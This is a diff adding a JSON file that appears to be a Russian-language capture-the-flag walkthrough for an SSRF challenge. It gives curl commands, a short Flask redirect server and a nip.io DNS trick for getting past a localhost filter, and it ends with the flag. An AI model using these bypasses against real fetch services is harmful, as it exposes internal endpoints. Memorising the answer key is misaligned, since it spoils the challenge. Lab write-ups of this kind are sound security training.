@@ -1,0 +1,34 @@
+{
+  "description": "CloudPaste — корпоративный сервис проверки доступности веб-страниц. Сервер выполняет HTTP-запросы от имени пользователя. Необходимо добраться до внутреннего эндпоинта /internal/flag, доступного только с localhost.",
+  "steps": [
+    {
+      "step": 1,
+      "title": "Разведка",
+      "detail": "Откройте главную страницу CloudPaste. Увидите форму для проверки URL. Введите внешний URL (например, https://example.com) и посмотрите, что сервер возвращает JSON со статусом, заголовками и телом ответа. Значит, запросы выполняются сервером. Также заметьте, что поле URL валидирует hostname, но разрешает редиректы.",
+      "command": "curl -X POST http://target:5000/api/fetch -d 'url=https://example.com'",
+      "screenshot": ""
+    },
+    {
+      "step": 2,
+      "title": "Проверка блокировки внутренних адресов",
+      "detail": "Попробуйте сразу ввести http://127.0.0.1:5000/internal/flag. Сервер ответит ошибкой 'Access to internal network is forbidden', потому что hostname фильтруется. Но фильтр проверяет только начальный URL, а не конечный после редиректа.",
+      "command": "curl -X POST http://target:5000/api/fetch -d 'url=http://127.0.0.1:5000/internal/flag'",
+      "screenshot": ""
+    },
+    {
+      "step": 3,
+      "title": "Обход через внешний редирект",
+      "detail": "Создайте или найдите внешний сервис/страницу, который отдаёт HTTP-редирект 302/301 на http://127.0.0.1:5000/internal/flag. Введите URL этой страницы в CloudPaste. Библиотека requests с allow_redirects=True проследит за редиректом и обратится к внутреннему адресу. В ответе получите флаг.",
+      "command": "# Пример своего сервера-редиректа\npython3 -c \"from flask import Flask,redirect; app=Flask(__name__); @app.route('/r')\ndef r(): return redirect('http://127.0.0.1:5000/internal/flag'); app.run(host='0.0.0.0', port=8000)\"\n\ncurl -X POST http://target:5000/api/fetch -d 'url=http://your-server:8000/r'",
+      "screenshot": ""
+    },
+    {
+      "step": 4,
+      "title": "Альтернатива: DNS-обход",
+      "detail": "Если нет внешнего редиректа, можно использовать DNS-запись, указывающую на 127.0.0.1 (например, локальные сервисы типа nip.io: 127-0-0-1.nip.io). Введите http://127-0-0-1.nip.io:5000/internal/flag — фильтр не распознает это как 127.0.0.1, но сервер резолвит его в 127.0.0.1.",
+      "command": "curl -X POST http://target:5000/api/fetch -d 'url=http://127-0-0-1.nip.io:5000/internal/flag'",
+      "screenshot": ""
+    }
+  ],
+  "flag": "flag{ssrf_cl0udp4st3_1nt3rn4l}"
+}
